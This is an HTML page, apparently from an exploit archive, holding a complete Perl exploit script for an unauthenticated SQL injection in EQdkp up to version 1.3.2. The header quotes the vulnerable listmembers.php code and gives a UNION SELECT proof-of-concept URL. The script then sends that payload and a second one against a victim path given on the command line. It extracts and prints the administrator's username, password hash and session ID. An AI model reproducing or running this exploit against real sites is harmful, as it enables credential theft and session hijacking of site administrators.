<html><head><title>EQdkp <= 1.3.2 (listmembers.php rank) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#################################################################################
#										#
#		      EQdkp &lt;= 1.3.2 SQL Injection Exploit			#
#										#
# Discovered by: Silentz							#
# Payload: Admin Username &amp; Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (listmembers.php):						#
#										#
#  $sql = 'SELECT m.*, (m.member_earned-m.member_spent+m.member_adjustment) 	#
#  AS member_current, member_status, r.rank_name, r.rank_hide, r.rank_prefix, 	#
#  r.rank_suffix, c.class_name AS member_class, c.class_armor_type AS 		#
#  armor_type, c.class_min_level AS min_level, c.class_max_level AS max_level	#
#  FROM ' . MEMBERS_TABLE . ' m, ' . MEMBER_RANKS_TABLE . ' r, ' . CLASS_TABLE 	#
#  . ' c WHERE c.class_id = m.member_class_id AND (m.member_rank_id = 		#
#  r.rank_id)';									#
#    										#
# 	if ( !empty($_GET['rank']) )						#
#    {										#
#        $sql .= &quot; AND r.rank_name='&quot; . urldecode($_GET['rank']) . &quot;'&quot;;		#
#    }										#
#										#
# PoC: http://victim.com/listmembers.php?show=all&amp;rank=%2527 UNION SELECT 	#
#      0,username,0,0,0,0,0,0,0,0,0,0,0,0,0,user_password,0,NULL,NULL,0,0,0,0 	#
#      FROM eqdkp_users where user_id=1/*					#
# 										#
# Subject To: Nothing, no authentication...nada!				#
# GoogleDork: Get your own!							#
#										#
# Shoutz: The entire w4ck1ng community						#
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV &lt; 1){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;                  EQdkp &lt;= 1.3.2 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;Usage: w4ck1ng_eqdkp.pl [PATH]\r\n\r\n&quot;;
print &quot;[PATH] = Path where EQdkp is located\r\n\r\n&quot;;
print &quot;e.g. w4ck1ng_eqdkp.pl http://victim.com/eqdkp/\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
exit();
}

$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . &quot;listmembers.php?show=all&amp;rank=%2527 UNION SELECT 0,username,0,0,0,0,0,0,0,0,0,0,0,0,0,user_password,0,NULL,NULL,0,0,0,0 FROM eqdkp_users where user_id=1/*&quot;;
$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));

print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;                  EQdkp &lt;= 1.3.2 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;

if($res-&gt;content =~ /&quot;&gt;&lt;i&gt;(.*?)&lt;\/i&gt;&lt;\/a&gt;&lt;\/td&gt;/){
print &quot;[+] Admin User : $1\n&quot;;}

else {print &quot;\n[-] Unable to retrieve admin username...&quot;}

if($res-&gt;content =~ /&quot;&gt;([0-9a-fA-F]{32})&lt;\/a&gt;&lt;\/td&gt;/){
print &quot;[+] Admin Hash : $1&quot;;}

else {print &quot;\n[-] Unable to retrieve admin hash...\n&quot;;}

$host = $ARGV[0] . &quot;listmembers.php?show=all&amp;rank=%2527 UNION SELECT 0,session_id,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,NULL,NULL,0,0,0,0 FROM eqdkp_sessions where session_user_id=1/*&quot;;
$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));

if($res-&gt;content =~ /&quot;&gt;&lt;i&gt;(.*?)&lt;\/i&gt;&lt;\/a&gt;&lt;\/td&gt;/){
print &quot;[+] Admin SessionID : $1\n&quot;;} 

else {print &quot;\n[-] Unable to retrieve admin sessionid...he/she is not logged in!\n&quot;;}

print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;

# milw0rm.com [2007-06-04]</pre></html>